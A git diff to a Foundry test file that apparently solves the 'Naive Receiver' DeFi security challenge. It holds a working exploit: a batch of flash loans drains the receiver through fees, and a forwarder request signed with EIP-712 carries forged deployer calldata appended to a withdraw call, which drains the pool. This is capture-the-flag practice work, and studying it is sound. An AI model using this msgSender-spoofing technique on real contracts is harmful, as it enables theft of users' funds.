@@ -77,10 +77,8 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-    
-        //NOTE (tina):have to solve this with two or less transactions
-        //drain the receiver's funds by making it pay fees
-        bytes[] memory data = new bytes[](10);
+        //drain receiver by making it pay fee 10 times
+         bytes[] memory data = new bytes[](10);
         for (uint256 i = 0; i < 10; i++) {
             data[i] = abi.encodeWithSignature(
                 "flashLoan(address,address,uint256,bytes)",
@@ -93,19 +91,39 @@ contract NaiveReceiverChallenge is Test {
        
         pool.multicall(data);
 
-        //drain the pool's funds 
-        //in flashLoan function 'deposits[feeReceiver] += FIXED_FEE' meaning 'feeReceiver' has deposits
-        //and in withdraw function 'deposits[_msgSender()] -= amount;' meaning only someone with positive deposits can withdraw
-        //and in the test's check pool's config 'assertEq(pool.feeReceiver(), deployer)' means'feeReceiver=deployer'
-        vm.startPrank(address(deployer));
-        pool.withdraw(weth.balanceOf(address(pool)), payable(recovery));
-        vm.stopPrank();
-       
-       //this is why the exploit works: anyone can force the receiver to pay fees, and imposonate the feeReceiver to withdraw the accumulated WETH
-    }
+        //crafted withdraw call, with deployer's address forged on as the "from" suffi
+        bytes memory withdrawCall = abi.encodeCall(
+        pool.withdraw, (weth.balanceOf(address(pool)), payable(recovery))
+        );
+        bytes memory forgedCall = abi.encodePacked(withdrawCall, deployer); 
 
-        
-    
+        bytes[] memory calls = new bytes[](1);
+        calls[0] = forgedCall;
+
+
+        bytes memory multicallData = abi.encodeCall(pool.multicall, (calls));
+
+        //sign forwarder request
+        BasicForwarder.Request memory request = BasicForwarder.Request({
+        from: player,
+        target: address(pool),
+        value: 0,
+        gas: 100_000,
+        nonce: forwarder.nonces(player),
+        data: multicallData,
+        deadline: block.timestamp + 1 days
+        });
+            
+        // EIP-712 digest, built by hand since _hashTypedData is internal to the forwarder
+        bytes32 structHash = forwarder.getDataHash(request);
+        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", forwarder.domainSeparator(), structHash));
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
+        bytes memory signature = abi.encodePacked(r, s, v);
+
+        // Execute the forwarder request with the forged calldata
+        forwarder.execute(request, signature);
+
+    }
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
